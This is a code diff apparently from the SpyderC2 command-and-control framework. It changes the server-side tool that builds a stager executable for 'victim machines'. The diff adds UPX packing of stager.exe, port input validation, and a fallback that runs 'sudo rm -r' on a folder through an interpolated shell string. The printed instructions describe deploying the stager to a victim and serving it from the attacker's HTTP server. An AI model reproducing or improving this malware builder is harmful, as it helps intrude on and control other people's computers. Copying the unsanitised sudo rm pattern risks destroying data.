@@ -62,11 +62,16 @@ def fill_server_url():
 	print(colored("Enter listener IP",'cyan'))
 	server_ip = str(input())
 
-	print(colored("Enter listener port. Default is 8080",'cyan'))
-	server_port = str(input())
-
-	if server_port == '':
-		server_port = '8080'
+	while True:
+		print(colored("Enter listener port. Default is 8080",'cyan'))
+		server_port = str(input())
+		if server_port == '':
+			server_port = '8080'
+			break
+		elif not server_port.isdigit():
+			print("Please enter Port in integer")
+		else:
+			break
 
 	stager_path = os.path.join(PATH,'stager.py')
 
@@ -107,18 +112,48 @@ def check_file_existence(path,file):
 
 def delete_folder_contents(folder,server_logger):
 	for filename in os.listdir(folder):
-	    file_path = os.path.join(folder, filename)
-	    try:
-	        if os.path.isfile(file_path) or os.path.islink(file_path):
-	            os.unlink(file_path)
-	        elif os.path.isdir(file_path):
-	            shutil.rmtree(file_path)
-	    except Exception as e:
-	        server_logger.info_log(f"Failed to delete {file_path}. Reason: {e}",'red')
-	        server_logger.info_log(f"Please clear the tmp directory manually and try again.",'red')
-	        return False
+		file_path = os.path.join(folder, filename)
+		try:
+			if os.path.isfile(file_path) or os.path.islink(file_path):
+				os.unlink(file_path)
+			elif os.path.isdir(file_path):
+				shutil.rmtree(file_path)
+		except Exception as e:
+			server_logger.info_log(f"Failed to delete {file_path}. Reason: {e}",'yellow')
+
+			## Probably the current user doesn't have the privilege to remove files from tmp
+			try:
+				cmd  = f'sudo rm -r {folder}/*'
+				server_logger.info_log(f"\nAttempting to run {colored(cmd,'yellow')}")
+				subprocess.check_output(cmd,shell=True)
+				return True
+			except Exception as e:
+				server_logger.info_log(f"\nPlease clear the tmp directory manually and try again.",'red')
+				return False
 
 	return True
+
+
+def pack_exe(server_logger,exe_path,packer_path):
+	server_logger.info_log('Packing the created executable...')
+	if not os.path.isfile(exe_path):
+		server_logger.info_log(f'Executable not present at {exe_path}','yellow')
+		return False
+
+	if not os.path.isfile(packer_path):
+		server_logger.info_log(f'Packer binary not present at {packer_path}','yellow')
+		return False
+
+	try:
+		cmd  = f'{packer_path} {exe_path}'
+		server_logger.info_log(f"\nAttempting to run {colored(cmd,'cyan')}")
+		subprocess.check_output(cmd,shell=True)
+		return True
+	except Exception as e:
+		server_logger.info_log(e,'red')
+		return False
+
+
 
 def generate_stager(server_logger):
 	
@@ -133,9 +168,8 @@ def generate_stager(server_logger):
 	else:
 		os.mkdir(os.path.join(PATH,'shared','tmp'))
 
-	## For linux bianry : docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux
 
-
+	## Check for src files to copy
 	if not check_file_existence(PATH,'stager.spec'): return
 	if not check_file_existence(PATH,'requirements.txt'): return
 
@@ -152,14 +186,25 @@ def generate_stager(server_logger):
 	if not check_file_existence(PATH,os.path.join('shared','tmp','requirements.txt')): return
 
 
+	## We will attempt to pack the exe
+	exe_path = os.path.join(PATH,'shared','tmp','dist',os_name,'stager.exe')
+	packer_path = os.path.join(PATH,'utilities','upx','upx')
 	
 	try:
 		if not docker():
 			server_logger.info_log("Generating stager.. Please wait, this might take some time.")
 			subprocess.check_output(f'sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} ', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)
-			print(colored(f"exe dumped to {colored('<path_to_SpyderC2>/data/shared/tmp/dist/windows','cyan')}.Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
+
+			if pack_exe(server_logger,exe_path,packer_path):
+				server_logger.info_log('\nSucessfully Packed exe','green')
+			else:
+				server_logger.info_log("\nCouldn't pack exe",'yellow')
+
+
+
+			print(colored(f"exe dumped to {colored(f'<path_to_SpyderC2>/data/shared/tmp/dist/{os_name}','cyan')}. Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
 		else:
-			print(colored("\nPlease run the following command: "+ colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-'+os_name,'cyan')+" in "+colored('<path_to_SpyderC2>/data/shared/tmp','cyan')+" directory on the host machine. The stager will be generated in "+ colored('<path_to_SpyderC2>/data/shared/tmp/dist/windows','cyan')+". Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
+			print(colored("\nPlease run the following command: "+ colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-'+os_name + ' && ' + '../../utilities/upx/upx ../tmp/dist/'+os_name+'/stager.exe','cyan')+" in "+colored('<path_to_SpyderC2>/data/shared/tmp','blue')+" directory on the host machine.\n The stager will be generated in "+ colored('<path_to_SpyderC2>/data/shared/tmp/dist/'+os_name,'blue')+".\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
 	except subprocess.CalledProcessError as grepexc:                                                                                                   
 		print(colored(f"exe generation failed ","red"))
 
@@ -193,12 +238,19 @@ def main(args,db_object,server_logger):
 		cmd = str(input())
 
 		if cmd == 'http':
-			print(colored("Enter Listening Port. Default is 8080",'cyan'))
-			if docker(): print(colored('Please note , for docker the range of usable port is 8080-8100 due to increased startup times for forwarding. if you need more, adjust in the docker-compose.yml'))
-			port = str(input())
 
-			if port == '':
-				port='8080'
+			while True:
+				print(colored("Enter Listening Port. Default is 8080",'cyan'))
+				if docker(): print(colored('Please note , for docker the range of usable port is 8080-8100 due to increased startup times for forwarding. if you need more, adjust in the docker-compose.yml'))
+				port = str(input())
+
+				if port == '':
+					port='8080'
+					break
+				elif not port.isdigit():
+					print("Please enter Port in integer")
+				else:
+					break
 
 			obj = Listener.listener_exists(port)
 
